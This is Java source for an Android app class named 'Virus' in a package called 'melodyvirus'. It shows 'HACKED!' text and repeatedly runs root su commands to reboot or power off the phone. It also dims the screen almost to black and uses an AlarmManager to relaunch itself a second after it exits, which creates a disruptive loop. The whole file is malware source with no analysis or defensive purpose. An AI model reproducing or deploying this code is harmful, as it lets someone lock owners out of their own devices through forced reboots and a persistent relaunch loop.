package com.johnmelodyme.melodyvirus;

import androidx.appcompat.app.AppCompatActivity;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.util.Log;
import android.view.Window;
import android.view.WindowManager;
import android.widget.TextView;
import android.widget.Toast;

import java.io.DataOutputStream;
import java.io.IOException;

public class Virus extends AppCompatActivity {
    TextView text;
    Handler handler;

    private void init() {
        text = findViewById(R.id.textView);
        handler = new Handler();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        init();

        text.setText("");
        text.setText("YOU");
        text.setText("ARE");
        text.setText("HACKED!");
        text.setText("");

        try {
            Runtime.getRuntime().exec(new String[]{"/system/bin/su","-c","reboot now"});
        } catch (IOException e) {
            e.printStackTrace();
        }
        try
        {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes("reboot \n");
        }
        catch (Throwable t) {t.printStackTrace();}

        try {
            Runtime.getRuntime().exec(new String[]{"/system/xbin/su","-c","reboot now"});
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            Process proc = Runtime.getRuntime().exec(new String[] { "su", "-c", "reboot" });
            proc.waitFor();
        } catch (InterruptedException | IOException e) {
            e.printStackTrace();
        }

        Window w = getWindow();
        WindowManager.LayoutParams lp = w.getAttributes();
        lp.screenBrightness =.005f;
        w.setAttributes (lp);

        try {
            Process proc = Runtime.getRuntime()
                    .exec(new String[]{ "su", "-c", "reboot -p" });
            proc.waitFor();
        } catch (Exception ex) {
            ex.printStackTrace();
        }

        Intent V = new Intent(Virus.this, Virus.class);
        int mPendingIntentId = 123456;
        PendingIntent mPendingIntent = PendingIntent.getActivity(Virus.this, mPendingIntentId, V, PendingIntent.FLAG_CANCEL_CURRENT);
        AlarmManager mgr = (AlarmManager)Virus.this.getSystemService(Context.ALARM_SERVICE);
        mgr.set(AlarmManager.RTC, System.currentTimeMillis() + 1000, mPendingIntent);
        System.exit(0);
        while(true){
            Toast.makeText(this, "Hacked", Toast.LENGTH_SHORT).show();
        }
        /*
        Intent intent = new Intent("android.intent.action.ACTION_REQUEST_SHUTDOWN");
        intent.putExtra("android.intent.extra.KEY_CONFIRM", true);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
         */
    }
}